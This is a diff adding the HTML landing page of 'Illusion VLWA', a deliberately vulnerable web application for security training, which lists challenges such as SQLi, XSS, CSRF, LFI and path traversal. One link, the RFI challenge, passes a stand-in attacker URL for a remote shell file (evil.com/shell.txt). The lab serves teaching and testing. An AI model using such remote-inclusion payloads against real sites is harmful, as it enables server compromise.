@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Illusion VLWA</title>
+  <link rel="icon" href="/img/logo.ico" type="image/svg+xml">
+  <style>
+    body {
+      background-color: #0f0f1a;
+      color: #00ff88;
+      font-family: monospace;
+      text-align: center;
+      padding: 50px;
+    }
+    a {
+      color: #00ccff;
+      display: block;
+      margin: 10px;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .warning {
+      color: red;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Illusion VLWA</h1>
+  <h2>Uma Aplicação Web Vulnerável para testes</h2>
+
+  <h2>🔍 Desafios Disponíveis</h2>
+  <a href="/pages/login/login.html">🔑 Login Inseguro (SQLi)</a>
+  <a href="search.php?q=test">🧠 Reflected XSS</a>
+  <a href="comment.php">📝 Stored XSS</a>
+  <a href="change_email.php">📧 CSRF - Alterar Email</a>
+  <a href="admin.php">🔒 Acesso não Autorizado (BAC)</a>
+  <a href="view.php?page=home">📄 LFI - Inclusão Local</a>
+  <a href="remote.php?url=http://evil.com/shell.txt">🌐 RFI - Inclusão Remota</a>
+  <a href="download.php?file=log.txt">📁 Path Traversal</a>
+</body>
+</html>
